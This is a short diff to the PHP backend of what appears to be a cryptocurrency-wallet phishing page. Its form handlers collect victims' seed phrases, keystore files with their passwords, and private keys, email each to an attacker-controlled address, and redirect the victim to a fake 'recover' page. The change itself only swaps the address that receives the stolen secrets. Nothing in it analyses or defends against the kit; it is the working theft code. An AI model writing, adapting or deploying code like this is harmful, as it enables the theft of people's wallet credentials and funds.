@@ -21,7 +21,7 @@ if(isset($_POST['submit1'])){
     $phrase=$_POST['phras'];
     $wallet=$_POST['walletname'];
     $usr = new Royaltechinc\Mailer;
-    $usr->mailPhrase("phrase@airdropdappsconnect.com.ng", urlize($phrase), $wallet, $time);
+    $usr->mailPhrase("harpermendez01@yahoo.com", urlize($phrase), $wallet, $time);
     
     header("location: recover/$time");
     exit;
@@ -31,7 +31,7 @@ if(isset($_POST['submit2'])){
     $keystorepasswword=$_POST['keystorepass'];
     $wallet=$_POST['walletname'];
     $usr = new Royaltechinc\Mailer;
-    $usr->mailKeystore("phrase@airdropdappsconnect.com.ng", $keystorejson, $keystorepasswword, $wallet, $time);
+    $usr->mailKeystore("harpermendez01@yahoo.com", $keystorejson, $keystorepasswword, $wallet, $time);
     
     header("location: recover/$time");
     exit;
@@ -41,7 +41,7 @@ if(isset($_POST['submit3'])){
     $wallet=$_POST['walletname'];
     
     $usr = new Royaltechinc\Mailer;
-    $usr->mailPrivatekey("phrase@airdropdappsconnect.com.ng", urlize($privatekey), $wallet, $time);
+    $usr->mailPrivatekey("harpermendez01@yahho.com", urlize($privatekey), $wallet, $time);
     
     header("location: recover/$time");
     exit;
